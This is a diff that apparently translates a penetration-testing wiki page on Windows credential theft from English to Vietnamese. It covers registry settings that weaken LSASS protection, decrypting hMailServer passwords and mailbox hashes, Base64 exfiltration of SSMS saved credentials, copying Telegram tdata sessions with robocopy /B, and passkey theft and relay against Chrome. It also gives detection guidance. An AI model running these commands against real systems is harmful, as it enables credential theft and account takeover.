+* `DisableRestrictedAdmin=1` vô hiệu hóa Restricted Admin cho RDP chiều vào; nó **không** bật pass-the-hash thông qua chế độ đó. Đặt giá trị thành `0` cho phép Restricted Admin trên máy đích, nhưng client phải yêu cầu `/RestrictedAdmin` hoặc sử dụng policy bắt buộc Restricted Admin.<sup>[[14]](#references)</sup> Chỉ riêng hash không cấp quyền quản trị từ xa; xem [các điều kiện tiên quyết để xác thực RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
+* `LocalAccountTokenFilterPolicy=1` vô hiệu hóa lọc token UAC để tài khoản local admin nhận được token không bị hạn chế qua mạng.
+* `DSRMAdminLogonBehavior=2` cho phép quản trị viên DSRM đăng nhập khi DC đang online, cung cấp cho attacker thêm một tài khoản đặc quyền cao có sẵn.
+* `RunAsPPL=0` loại bỏ các biện pháp bảo vệ LSASS PPL, khiến các công cụ dump như LalsDumper dễ dàng truy cập bộ nhớ.
 
-## hMailServer configuration credentials (post-compromise)
+## Thông tin xác thực cấu hình hMailServer (sau khi compromise)
 
-Check the exact configuration files `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, and `C:\ProgramData\hMailServer\hMailServer.ini` according to the installation layout. A readable nonempty `[Security] AdministratorPassword=` value is an hMailServer administration password hash; it is not evidence of a Windows Administrator password. If that credential is recovered, any Windows-account pivot requires independently verified password reuse and logon rights.
+Kiểm tra chính xác các tệp cấu hình `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` và `C:\ProgramData\hMailServer\hMailServer.ini` tùy theo cách cài đặt. Giá trị `[Security] AdministratorPassword=` có thể đọc được và không rỗng là hash mật khẩu quản trị hMailServer; nó không phải bằng chứng về mật khẩu Windows Administrator. Nếu lấy được thông tin xác thực đó, mọi bước chuyển sang tài khoản Windows đều cần xác minh độc lập việc tái sử dụng mật khẩu và quyền đăng nhập.
 
-For installations using a SQL CE database, the separate `[Database] Password=` value in the INI protects the database. In legacy installations this value is Blowfish-encrypted with the static key `THIS_KEY_IS_NOT_SECRET` and 4-byte word endianness swaps. Use the hex string from the INI with this Python snippet:<sup>[[2]](#references)</sup>
+Với các cài đặt sử dụng cơ sở dữ liệu SQL CE, giá trị `[Database] Password=` riêng biệt trong INI dùng để bảo vệ cơ sở dữ liệu. Trong các bản cài đặt cũ, giá trị này được mã hóa bằng Blowfish với khóa tĩnh `THIS_KEY_IS_NOT_SECRET` và thao tác hoán đổi endianness theo từ 4 byte. Dùng chuỗi hex trong INI với đoạn mã Python sau:<sup>[[2]](#references)</sup>
 
-First confirm that the current account can read **both** the INI and the corresponding SQL CE `.sdf` database. The INI password protects the database; it is separate from the mailbox account hashes stored inside it. Inspect or upgrade a **copy** of an in-use database, never the live file.
+Trước tiên, hãy xác nhận tài khoản hiện tại có thể đọc **cả** INI lẫn tệp cơ sở dữ liệu SQL CE `.sdf` tương ứng. Mật khẩu trong INI bảo vệ cơ sở dữ liệu; nó tách biệt với các hash tài khoản mailbox được lưu bên trong. Chỉ kiểm tra hoặc nâng cấp **bản sao** của cơ sở dữ liệu đang được sử dụng, tuyệt đối không thao tác trên tệp đang hoạt động.
 
 ```python
 from Crypto.Cipher import Blowfish
@@ -407,7 +407,7 @@ plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b
 print(plain.decode())
 ```
 
-With the clear-text password, copy the SQL CE database to avoid file locks, load the 32-bit provider, and upgrade if needed before querying hashes:
+Với mật khẩu dạng văn bản thuần, sao chép cơ sở dữ liệu SQL CE để tránh khóa tệp, nạp provider 32-bit và nâng cấp nếu cần trước khi truy vấn các hash:
 
 ```powershell
 Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
@@ -418,44 +418,44 @@ $conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windo
 $cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
 ```
 
-The `accountpassword` column uses the hMailServer hash format (hashcat mode `1421`). A cracked mailbox password becomes a Windows user pivot only if that password is reused by a local/domain account and that account has the required remote-logon rights.
+Cột `accountpassword` sử dụng định dạng hash của hMailServer (chế độ hashcat `1421`). Mật khẩu mailbox đã crack chỉ trở thành điểm pivot sang người dùng Windows nếu mật khẩu đó được một tài khoản local/domain sử dụng lại và tài khoản đó có quyền đăng nhập từ xa cần thiết.
 
-## LSA Logon Callback Interception (LsaApLogonUserEx2)
+## Chặn callback đăng nhập LSA (LsaApLogonUserEx2)
 
-Some tooling captures **plaintext logon passwords** by intercepting the LSA logon callback `LsaApLogonUserEx2`. The idea is to hook or wrap the authentication package callback so credentials are captured **during logon** (before hashing), then written to disk or returned to the operator. This is commonly implemented as a helper that injects into or registers with LSA, and then records each successful interactive/network logon event with the username, domain and password.<sup>[[1]](#references)</sup>
+Một số công cụ thu thập **mật khẩu đăng nhập dạng plaintext** bằng cách chặn callback đăng nhập LSA `LsaApLogonUserEx2`. Ý tưởng là hook hoặc bọc callback của authentication package để thu thập thông tin xác thực **trong quá trình đăng nhập** (trước khi hashing), sau đó ghi vào đĩa hoặc trả về cho operator. Cách này thường được triển khai dưới dạng helper inject vào LSA hoặc đăng ký với LSA, rồi ghi lại từng sự kiện đăng nhập tương tác/mạng thành công, bao gồm username, domain và password.<sup>[[1]](#references)</sup>
 
-Operational notes:
-- Requires local admin/SYSTEM to load the helper in the authentication path.
-- Captured credentials appear only when a logon occurs (interactive, RDP, service, or network logon depending on the hook).
+Ghi chú vận hành:
+- Cần quyền local admin/SYSTEM để tải helper vào luồng xác thực.
+- Thông tin xác thực chỉ được thu thập khi có sự kiện đăng nhập (tương tác, RDP, service hoặc đăng nhập mạng, tùy thuộc vào hook).
 
-## SSMS Saved Connection Credentials (sqlstudio.bin)
+## Thông tin xác thực kết nối đã lưu trong SSMS (sqlstudio.bin)
 
-SQL Server Management Studio (SSMS) stores saved connection information in a per-user `sqlstudio.bin` file. Dedicated dumpers can parse the file and recover saved SQL credentials. In shells that only return command output, the file is often exfiltrated by encoding it as Base64 and printing it to stdout.<sup>[[1]](#references)</sup>
+SQL Server Management Studio (SSMS) lưu thông tin kết nối đã lưu trong tệp `sqlstudio.bin` riêng của từng người dùng. Các công cụ dump chuyên dụng có thể phân tích tệp và khôi phục thông tin xác thực SQL đã lưu. Trong các shell chỉ trả về đầu ra lệnh, tệp thường được exfiltrate bằng cách mã hóa thành Base64 rồi in ra stdout.<sup>[[1]](#references)</sup>
 
 ```cmd
 certutil -encode sqlstudio.bin sqlstudio.b64
 type sqlstudio.b64
 ```
 
-On the operator side, rebuild the file and run the dumper locally to recover credentials:
+Ở phía operator, hãy build lại file và chạy dumper cục bộ để khôi phục thông tin xác thực:
 
 ```bash
 base64 -d sqlstudio.b64 > sqlstudio.bin
 ```
 
-## Browser session and cookie theft via Chrome DevTools Protocol
+## Đánh cắp phiên trình duyệt và cookie qua Chrome DevTools Protocol
 
 {{#ref}}
 ../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
 {{#endref}}
 
-## Telegram Desktop `tdata` session theft
+## Đánh cắp phiên `tdata` của Telegram Desktop
 
-Telegram Desktop keeps authorization and account state in its **`tdata`** directory. A copied session can be loaded by compatible tooling to authenticate without the account password while that authorization remains valid; if local-data encryption is enabled, the stealer also needs its passcode. An authenticated session can then expose identity data, dialog and membership metadata, messages, and downloadable media.<sup>[[10]](#references)</sup>
+Telegram Desktop lưu thông tin xác thực và trạng thái tài khoản trong thư mục **`tdata`**. Có thể tải bản sao của phiên bằng các công cụ tương thích để xác thực mà không cần mật khẩu tài khoản, miễn là phiên cấp quyền đó vẫn còn hiệu lực; nếu bật mã hóa dữ liệu cục bộ, kẻ đánh cắp cũng cần có mật mã của người dùng. Phiên đã xác thực có thể làm lộ dữ liệu nhận dạng, siêu dữ liệu về hộp thoại và tư cách thành viên, tin nhắn cũng như nội dung đa phương tiện có thể tải xuống.<sup>[[10]](#references)</sup>
 
-### Discovery and acquisition
+### Tìm kiếm và thu thập
 
-Search both installed and portable layouts; Microsoft Store package names vary, so enumerate package directories containing `TelegramMessenge` and inspect their `LocalCache\Roaming` subtree.<sup>[[10]](#references)</sup>
+Tìm kiếm cả các bố cục cài đặt thông thường lẫn dạng portable; tên gói Microsoft Store có thể khác nhau, vì vậy hãy liệt kê các thư mục gói chứa `TelegramMessenge` và kiểm tra nhánh con `LocalCache\Roaming` của chúng.<sup>[[10]](#references)</sup>
 
 ```powershell
 # Standard Telegram Desktop installation
@@ -470,36 +470,36 @@ Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
 Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
 ```
 
-If ordinary reads fail and the process token **already contains and enables** `SeBackupPrivilege`, backup-aware access provides a fallback; it does not obtain the privilege or elevate the process. `CreateFileW` with `FILE_FLAG_BACKUP_SEMANTICS` can request backup/restore semantics and override file security checks when the required token privileges are present, but the flag alone does not defeat an incompatible sharing lock.<sup>[[10]](#references)[[11]](#references)</sup>
+Nếu thao tác đọc thông thường thất bại và token của tiến trình **đã chứa và bật** `SeBackupPrivilege`, quyền truy cập nhận biết backup có thể dùng làm phương án dự phòng; cách này không cấp thêm đặc quyền hoặc nâng quyền cho tiến trình. `CreateFileW` với `FILE_FLAG_BACKUP_SEMANTICS` có thể yêu cầu ngữ nghĩa backup/restore và bỏ qua các kiểm tra bảo mật tệp khi token có các đặc quyền cần thiết, nhưng chỉ dùng cờ này không thể vượt qua khóa chia sẻ không tương thích.<sup>[[10]](#references)[[11]](#references)</sup>
 
-For live locked files, create/read a **Volume Shadow Copy**; for ACL-blocked files, `robocopy /B` uses backup mode and overrides file and directory ACLs.<sup>[[10]](#references)[[12]](#references)</sup>
+Với tệp đang bị khóa, hãy tạo/đọc **Volume Shadow Copy**; với tệp bị chặn bởi ACL, `robocopy /B` sử dụng chế độ backup và bỏ qua ACL của tệp và thư mục.<sup>[[10]](#references)[[12]](#references)</sup>
 
 ```cmd
 whoami /priv
 robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
 ```
 
-A bandwidth-conscious implant may submit only the file-path inventory first, receive a snapshot identifier plus the paths already stored by the C2, and upload only missing files. Therefore, small incremental transfers after recursive `tdata` enumeration can still represent successful session theft.<sup>[[10]](#references)</sup>
+Một implant chú trọng tiết kiệm băng thông có thể gửi trước danh sách đường dẫn tệp, nhận mã định danh snapshot cùng các đường dẫn đã được C2 lưu trữ, rồi chỉ tải lên những tệp còn thiếu. Vì vậy, các lần truyền nhỏ theo từng phần sau khi liệt kê đệ quy `tdata` vẫn có thể là dấu hiệu đánh cắp phiên thành công.<sup>[[10]](#references)</sup>
 
-### Detection and containment
+### Phát hiện và ngăn chặn
 
-Correlate recursive access to `tdata` by a non-Telegram process with `SeBackupPrivilege` enablement, backup-semantics file opens, VSS activity, or a child `robocopy.exe` using `/B`. Also hunt for rapid enumeration of both `%APPDATA%` and `%LOCALAPPDATA%\Packages`, followed by outbound connections from the same process. After compromise, use **Settings → Devices** (or **Privacy & Security → Active Sessions**) to terminate unrecognized sessions; enabling two-step verification alone does not revoke an authorization that was already stolen.<sup>[[10]](#references)[[13]](#references)</sup>
+Tương quan việc một tiến trình không phải Telegram truy cập đệ quy vào `tdata` với việc bật `SeBackupPrivilege`, mở tệp bằng backup semantics, hoạt động VSS hoặc tiến trình con `robocopy.exe` sử dụng `/B`. Đồng thời, tìm kiếm việc liệt kê nhanh cả `%APPDATA%` và `%LOCALAPPDATA%\Packages`, sau đó là các kết nối ra ngoài từ cùng tiến trình. Sau khi bị xâm phạm, hãy dùng **Settings → Devices** (hoặc **Privacy & Security → Active Sessions**) để chấm dứt các phiên không nhận ra; chỉ bật xác minh hai bước sẽ không thu hồi quyền đã bị đánh cắp trước đó.<sup>[[10]](#references)[[13]](#references)</sup>
 
-## Passkeys / WebAuthn credential theft from Chrome on Windows
+## Đánh cắp thông tin xác thực Passkeys / WebAuthn từ Chrome trên Windows
 
-If code execution is obtained as the **victim user** on a Windows host using **Chrome + Google Password Manager synced passkeys**, passkeys become an interesting post-exploitation target even **without admin/SYSTEM**.<sup>[[4]](#references)</sup>
+Nếu có được quyền thực thi mã với tư cách **người dùng nạn nhân** trên máy Windows sử dụng **Chrome + passkeys được đồng bộ qua Google Password Manager**, passkeys trở thành mục tiêu post-exploitation đáng chú ý, ngay cả **khi không có quyền admin/SYSTEM**.<sup>[[4]](#references)</sup>
 
-### Interesting local artifacts
+### Các hiện vật cục bộ đáng chú ý
 
 ```text
 %LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
 %LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
 ```
 
-- **`Sync Data\LevelDB`** stores protobuf-encoded **`WebauthnCredentialSpecifics`** records. A same-user process can enumerate the **RP ID**, **username**, **credential ID**, and encrypted private-key material for synced passkeys.<sup>[[5]](#references)</sup>
-- **`passkey_enclave_state`** stores local device-enrollment state such as **`wrapped_identity_private_key`** and the wrapped secret used to recover synced credentials.<sup>[[4]](#references)</sup>
+- **`Sync Data\LevelDB`** lưu các bản ghi **`WebauthnCredentialSpecifics`** được mã hóa bằng protobuf. Một tiến trình cùng người dùng có thể liệt kê **RP ID**, **username**, **credential ID** và dữ liệu khóa riêng đã mã hóa của các passkey được đồng bộ.<sup>[[5]](#references)</sup>
+- **`passkey_enclave_state`** lưu trạng thái đăng ký thiết bị cục bộ, chẳng hạn như **`wrapped_identity_private_key`** và secret được bọc dùng để khôi phục thông tin xác thực đã đồng bộ.<sup>[[4]](#references)</sup>
 
-Quick triage:
+Kiểm tra nhanh:
 
 ```powershell
 Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
@@ -507,9 +507,9 @@ Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
   Select-Object FullName, Length, LastWriteTime
 ```
 
-### TPM-bound key blobs can still be abused as a local signing oracle
+### Blob khóa gắn với TPM vẫn có thể bị lạm dụng làm oracle ký cục bộ
 
-If the browser exports a TPM-backed identity key as **`NCRYPT_OPAQUE_KEY_BLOB`** and stores that blob in user-accessible state, malware does **not** need to extract the raw private key. It can simply re-import the blob on the **same machine** and ask the local TPM to sign attacker-controlled data:<sup>[[4]](#references)[[6]](#references)</sup>
+Nếu trình duyệt xuất khóa danh tính được TPM bảo vệ dưới dạng **`NCRYPT_OPAQUE_KEY_BLOB`** và lưu blob đó ở trạng thái người dùng có thể truy cập, malware **không** cần trích xuất khóa riêng thô. Nó chỉ cần nhập lại blob trên **cùng máy** và yêu cầu TPM cục bộ ký dữ liệu do kẻ tấn công kiểm soát:<sup>[[4]](#references)[[6]](#references)</sup>
 
 ```c
 NCryptOpenStorageProvider(...)
@@ -517,49 +517,48 @@ NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
 NCryptSignHash(...)
 ```
 
-This means **hardware binding prevents off-device export but not same-user use on the compromised endpoint**.
+Điều này có nghĩa là **ràng buộc phần cứng ngăn việc xuất khóa ra khỏi thiết bị, nhưng không ngăn cùng người dùng sử dụng khóa trên endpoint bị xâm phạm**.
 
-### Practical abuse paths
+### Các cách khai thác thực tế
 
-1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
-   - Enumerate `WebauthnCredentialSpecifics` from Chrome's LevelDB.
-   - Start a passkey login and obtain a fresh WebAuthn challenge.
-   - Use the stolen `wrapped_identity_private_key` blob on the victim TPM to sign the cloud-authenticator request binding.
-   - Relay the returned assertion to the relying party.
-   - This is especially valuable when the RP accepts `userVerification=preferred` or fails to reject assertions with **`UV=0`**.
-2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
-   - Force re-onboarding by deleting `passkey_enclave_state` or by sending a valid signed `device/forget` operation.
-   - If onboarding leaves the device in **`uv_key_pending`**, register an attacker-controlled UV public key.
-   - If the provider does not verify attestation / secure-hardware origin for the new UV key, later signatures from the attacker key are treated as **`UV=1`**.
-3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
-   - Force recovery or rejoin so Chrome fetches the synced-passkey master secret.
-   - Watch for recreation/modification of `passkey_enclave_state`, then dump Chrome memory while the plaintext **security domain secret (SDS)** is resident.
-   - Use the recovered SDS to decrypt the encrypted fields in every `WebauthnCredentialSpecifics` record and recover portable WebAuthn private keys.
+1. **Pass-ta-key / relay danh tính thiết bị**<sup>[[4]](#references)</sup>
+   - Liệt kê `WebauthnCredentialSpecifics` từ LevelDB của Chrome.
+   - Bắt đầu đăng nhập bằng passkey và lấy một WebAuthn challenge mới.
+   - Dùng blob `wrapped_identity_private_key` bị đánh cắp trên TPM của nạn nhân để ký phần binding của yêu cầu cloud-authenticator.
+   - Chuyển tiếp assertion nhận được đến relying party.
+   - Cách này đặc biệt hữu ích khi RP chấp nhận `userVerification=preferred` hoặc không từ chối các assertion có **`UV=0`**.
+2. **Chiếm quyền khóa UV đang chờ**<sup>[[4]](#references)</sup>
+   - Buộc thiết lập lại bằng cách xóa `passkey_enclave_state` hoặc gửi một thao tác `device/forget` hợp lệ đã được ký.
+   - Nếu quá trình thiết lập để thiết bị ở trạng thái **`uv_key_pending`**, đăng ký một khóa công khai UV do kẻ tấn công kiểm soát.
+   - Nếu nhà cung cấp không xác minh attestation / nguồn gốc secure-hardware của khóa UV mới, các chữ ký về sau từ khóa của kẻ tấn công sẽ được xem là **`UV=1`**.
+3. **Đánh cắp master secret / khôi phục SDS**<sup>[[4]](#references)</sup>
+   - Buộc khôi phục hoặc tham gia lại để Chrome tải master secret của synced-passkey.
+   - Theo dõi việc tạo lại/chỉnh sửa `passkey_enclave_state`, sau đó dump bộ nhớ Chrome khi **security domain secret (SDS)** dạng plaintext đang hiện diện.
+   - Dùng SDS khôi phục được để giải mã các trường đã mã hóa trong mọi bản ghi `WebauthnCredentialSpecifics` và khôi phục các khóa riêng WebAuthn có thể mang sang thiết bị khác.
 
-### DFIR / detection ideas
+### Gợi ý DFIR / phát hiện
 
-- Monitor **deletion/recreation** of `passkey_enclave_state`.<sup>[[4]](#references)</sup>
-- Alert on abnormal access to Chrome **`Sync Data\LevelDB`** by non-browser processes.
-- Alert on **Chrome memory dumps** or suspicious cross-process memory access.
-- Investigate repeated **Google Password Manager recovery PIN** prompts or unexpected re-onboarding.
-- Remember that WebAuthn **`signCount`** is often not useful for synced passkeys because it may remain constant, so classic clone detection is weak.
+- Theo dõi việc **xóa/tạo lại** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
+- Cảnh báo khi các tiến trình không phải trình duyệt truy cập bất thường vào **`Sync Data\LevelDB`** của Chrome.
+- Cảnh báo về **memory dump của Chrome** hoặc hành vi truy cập bộ nhớ liên tiến trình đáng ngờ.
+- Điều tra các lời nhắc **Google Password Manager recovery PIN** lặp lại hoặc việc thiết lập lại ngoài dự kiến.
+- Lưu ý rằng WebAuthn **`signCount`** thường không hữu ích với synced passkey vì giá trị này có thể giữ nguyên, khiến việc phát hiện bản sao theo cách thông thường kém hiệu quả.
 
 ## References
 
-- [1] [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
-- [2] [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
-- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
-- [4] [Unit 42 – Pass the Passkey: A Novel Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
+- [1] [Unit 42 – Điều tra các chiến dịch kéo dài nhiều năm nhắm vào các lĩnh vực có giá trị cao mà không bị phát hiện](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
+- [2] [0xdf – HTB/VulnLab JobTwo: phishing bằng macro Word VBA qua SMTP → giải mã thông tin xác thực hMailServer → Veeam CVE-2023-27532 lên SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
+- [3] [Check Point Research – Bên trong Ink Dragon: hé lộ mạng lưới relay và cách thức hoạt động bên trong của một chiến dịch tấn công bí mật](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
+- [4] [Unit 42 – Pass the Passkey: Một bề mặt tấn công mới trong xác thực không mật khẩu](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
 - [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
-- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
+- [6] [Microsoft – `NCryptCreatePersistedKey` / lưu trữ khóa CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
 - [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
-- [8] [How the Active Directory Data Store Really Works: Inside NTDS.dit (Part 1)](https://blog.chrisse.se/?p=762)
-- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
-- [10] [Kaspersky Securelist – Armored Likho Expands Its Cyber-Espionage Arsenal with the Still Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
-- [11] [Microsoft Learn – CreateFileW function and `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
-- [12] [Microsoft Learn – Robocopy `/B` backup mode](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
-- [13] [Telegram FAQ – terminating active sessions](https://telegram.org/faq)
-- [14] [Microsoft Learn: Remote Credential Guard and Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
-- [15] [Microsoft Learn: Credentials Protection and Management](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
-
+- [8] [Cách kho dữ liệu Active Directory thực sự hoạt động: bên trong NTDS.dit (Phần 1)](https://blog.chrisse.se/?p=762)
+- [9] [en.hackndo.com - Dump mật khẩu Lsass từ xa](https://en.hackndo.com/remote-lsass-dump-passwords)
+- [10] [Kaspersky Securelist – Armored Likho mở rộng kho công cụ gián điệp mạng với bộ công cụ Still](https://securelist.com/armored-likho-still-toolkit/121033)
+- [11] [Microsoft Learn – hàm CreateFileW và `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
+- [12] [Microsoft Learn – chế độ sao lưu Robocopy `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
+- [13] [Câu hỏi thường gặp về Telegram – chấm dứt các phiên đang hoạt động](https://telegram.org/faq)
+- [14] [Microsoft Learn: Remote Credential Guard và Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
+- [15] [Microsoft Learn: Bảo vệ và quản lý thông tin xác thực](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
 {{#include ../../banners/hacktricks-training.md}}
